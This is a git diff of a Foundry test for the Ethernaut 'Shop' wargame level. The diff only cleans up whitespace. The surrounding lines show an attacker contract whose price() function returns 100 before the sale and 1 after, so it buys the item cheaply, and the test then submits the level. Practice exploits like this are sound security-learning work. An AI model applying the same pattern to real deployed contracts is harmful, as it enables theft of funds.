@@ -8,9 +8,9 @@ import "forge-std/console2.sol";
 
 contract ShopHack {
     address shop;
-    
+
     constructor(address _shop) {
-        shop = _shop;    
+        shop = _shop;
     }
 
     function attack() public {
@@ -23,7 +23,7 @@ contract ShopHack {
         (bool isSold) = abi.decode(data, (bool));
         if (!isSold) {
             return 100;
-        } else { 
+        } else {
             return 1;
         }
     }
@@ -52,7 +52,6 @@ contract ShopTest is Test {
 
         attacker.attack();
 
-        
         // submission
         bool levelPassed = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
